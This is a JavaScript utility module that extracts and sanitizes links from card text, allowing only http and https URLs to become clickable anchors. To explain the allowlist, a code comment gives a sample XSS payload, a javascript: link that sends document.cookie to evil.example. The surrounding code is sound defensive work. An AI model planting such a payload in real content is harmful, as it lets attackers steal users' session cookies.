/**
 * CARD LINKS — reading the links out of a card's own text
 *
 * The Card Editor's Links section is a READ-ONLY VIEW of text that already
 * exists on the card. Nothing here is stored:
 *
 *   - no new field on a node, so no migration and nothing to back-fill
 *   - invisible to the autosave effect, the Firestore saver, `takeSnapshot`,
 *     the MiniMap and the id audit, all of which read from `workspaces`
 *   - therefore safe in View and Arrange mode, because it never writes
 *
 * The links are re-derived from the title and content every render. That is the
 * whole reason the list can never disagree with the card: there is only one copy
 * of the truth, and it is the text the user typed.
 *
 * This module is pure so the fiddly part — deciding what counts as a link — can
 * be tested without rendering React. Getting it wrong is not a cosmetic bug:
 * `isSafeHttpUrl` is what stops a `javascript:` URL in imported card text from
 * being turned into a live anchor.
 */

// Only these two schemes are ever turned into a clickable anchor.
//
// This is an ALLOWLIST, deliberately, and not a blocklist of `javascript:` and
// friends. Card content is arbitrary user text and a workspace can be imported
// from a file someone else made, so a card containing
//
//   [click me](javascript:fetch('https://evil.example/'+document.cookie))
//
// is a real script-injection route the moment we render it as an <a href>. A
// blocklist has to imagine every dangerous scheme in advance — `data:`,
// `vbscript:`, `blob:`, `filesystem:` — and loses the day a new one appears. An
// allowlist fails closed: an unrecognised scheme is simply not a link.
const SAFE_PROTOCOLS = ['http:', 'https:'];

// Trailing characters that are almost always sentence punctuation rather than
// part of the address. "See https://example.com." should not link to a URL with
// a full stop glued on the end.
const TRAILING_PUNCTUATION = ['.', ',', ';', ':', '!', '?', '"', "'", '*', '_', '~', '>'];

/**
 * Remove fenced code blocks (``` ... ```) from text.
 *
 * A URL inside a code fence is sample text, not a destination — it belongs to a
 * snippet the user is quoting, and listing it as somewhere to visit is noise.
 *
 * Inline code is deliberately LEFT ALONE. Wrapping a single URL in backticks is
 * a common way to get monospace formatting for a link you genuinely use, so
 * `https://api.example.com/v1` still counts. The line is drawn at fences
 * because a fence signals "this is a block of code", where an inline backtick
 * only signals "render this in monospace".
 *
 * Content is replaced with spaces rather than deleted so that every remaining
 * character keeps its original index, which is what preserves document order.
 */
function maskCodeFences(text) {
  return text.replace(/```[\s\S]*?(?:```|$)/g, (block) => ' '.repeat(block.length));
}

/** Blank out a span while keeping every other character at its original index. */
function maskSpan(text, start, length) {
  return text.slice(0, start) + ' '.repeat(length) + text.slice(start + length);
}

/**
 * Strip trailing punctuation, and strip a trailing bracket only when it is
 * unbalanced.
 *
 * The bracket rule is what makes Wikipedia-style URLs survive. In
 *
 *   (see https://en.wikipedia.org/wiki/Cat)
 *
 * the final ) closes the sentence's bracket and must go. But in
 *
 *   https://en.wikipedia.org/wiki/Cat_(animal)
 *
 * the ) is part of the address, and it is balanced by the ( inside the URL, so
 * it stays. Counting the brackets inside the candidate tells the two apart.
 */
export function trimTrailingPunctuation(candidate) {
  let url = candidate;
  let changed = true;

  while (changed && url.length > 0) {
    changed = false;

    const last = url[url.length - 1];

    if (TRAILING_PUNCTUATION.includes(last)) {
      url = url.slice(0, -1);
      changed = true;
      continue;
    }

    if (last === ')' || last === ']') {
      const open = last === ')' ? '(' : '[';
      const opens = url.split(open).length - 1;
      const closes = url.split(last).length - 1;
      if (closes > opens) {
        url = url.slice(0, -1);
        changed = true;
      }
    }
  }

  return url;
}

/**
 * Turn a raw candidate into a safe absolute URL, or return null.
 *
 * Returning null — rather than throwing, or returning the input unchanged — is
 * what lets every caller treat "not a link" and "not safe" as the same
 * uninteresting outcome.
 */
export function normalizeUrl(candidate) {
  if (typeof candidate !== 'string') return null;

  const trimmed = candidate.trim();
  if (!trimmed) return null;

  // A bare `www.` host has no scheme, so the URL parser would reject it. Users
  // write hostnames this way constantly, and https is the right assumption in
  // 2026 — a site that only speaks http will redirect.
  const withScheme = /^www\./i.test(trimmed) ? `https://${trimmed}` : trimmed;

  let parsed;
  try {
    parsed = new URL(withScheme);
  } catch {
    // Relative paths like /docs/setup land here. There is no base URL to
    // resolve them against — a card is not a web page — so they are not links.
    return null;
  }

  if (!SAFE_PROTOCOLS.includes(parsed.protocol)) return null;

  // A URL with no host (http:///, http://) has nowhere to go.
  if (!parsed.hostname) return null;

  return parsed.href;
}

/** True when a string is a link we are willing to render as an anchor. */
export function isSafeHttpUrl(candidate) {
  return normalizeUrl(candidate) !== null;
}

/**
 * The human-readable name for a URL when the card gave us no label.
 *
 * The hostname is the most useful few characters available: it tells you where
 * you are about to go, which is the question the list exists to answer. The
 * `www.` is dropped because it distinguishes nothing.
 */
export function hostLabel(url) {
  try {
    return new URL(url).hostname.replace(/^www\./i, '');
  } catch {
    return url;
  }
}

/**
 * Collect the links in one block of text, in the order they appear.
 *
 * The three passes run in a fixed order — markdown links, then angle autolinks,
 * then bare URLs — and each pass blanks out what it consumed. Without that, the
 * URL inside `[Docs](https://x.com)` would be found a second time by the bare
 * pass and the same link would appear twice.
 */
function collectFromText(text) {
  if (!text) return [];

  let working = maskCodeFences(text);
  const found = [];

  // Pass 1 — markdown links: [label](url "optional title")
  //
  // The URL pattern allows one level of BALANCED parentheses so that
  // [Cat](https://en.wikipedia.org/wiki/Cat_(animal)) keeps its closing bracket
  // instead of being cut off at the underscore.
  const markdownLink = /\[([^\]\n]*)\]\(\s*((?:[^\s()]|\([^\s()]*\))+)(?:\s+"[^"]*")?\s*\)/g;
  const markdownMatches = [...working.matchAll(markdownLink)];
  for (const match of markdownMatches) {
    found.push({ index: match.index, rawUrl: match[2], rawLabel: match[1], delimited: true });
  }

  // Pass 2 — angle autolinks: <https://example.com>
  const angleLink = /<((?:https?:\/\/|www\.)[^>\s]+)>/gi;
  const angleMatches = [...working.matchAll(angleLink)];
  for (const match of angleMatches) {
    found.push({ index: match.index, rawUrl: match[1], rawLabel: '', delimited: true });
  }

  // Blank out everything the delimited passes consumed, back to front so the
  // earlier match indices stay valid. Without this the URL inside
  // [Docs](https://x.com) would be found again by the bare pass below.
  for (const match of [...markdownMatches, ...angleMatches].sort((a, b) => b.index - a.index)) {
    working = maskSpan(working, match.index, match[0].length);
  }

  // Pass 3 — bare URLs. The character class stops at whitespace and at the
  // quotes and brackets that wrap URLs in prose; trailing punctuation that
  // slips through is cleaned up afterwards by `trimTrailingPunctuation`.
  const bareUrl = /(?:https?:\/\/|www\.)[^\s<>"'`\\]+/gi;
  for (const match of working.matchAll(bareUrl)) {
    found.push({ index: match.index, rawUrl: match[0], rawLabel: '', delimited: false });
  }

  return found.sort((a, b) => a.index - b.index);
}

/**
 * Every link on a card, in the order a reader meets them.
 *
 * Title before content, because the title is read first. A card whose title is
 * just a URL is a common way to park a reference, so the title is scanned too
 * rather than content alone.
 *
 * Returns an array of `{ url, label }`. Duplicates are collapsed on the final
 * normalized URL and the FIRST occurrence wins, label included: the list is a
 * way to reach a destination, and the same destination twice is two rows that
 * do the same thing.
 */
export function extractLinks(title, content) {
  const raw = [
    ...collectFromText(typeof title === 'string' ? title : ''),
    ...collectFromText(typeof content === 'string' ? content : ''),
  ];

  const links = [];
  const seen = new Set();

  for (const item of raw) {
    // Only BARE URLs get punctuation-trimmed. A markdown or angle-bracket link
    // states exactly where it ends, so its last character is the author's
    // choice and trimming it would corrupt a deliberate address.
    const candidate = item.delimited ? item.rawUrl : trimTrailingPunctuation(item.rawUrl);

    const url = normalizeUrl(candidate);
    if (!url) continue;
    if (seen.has(url)) continue;

    seen.add(url);

    const label = item.rawLabel.trim();
    links.push({ url, label: label || hostLabel(url) });
  }

  return links;
}
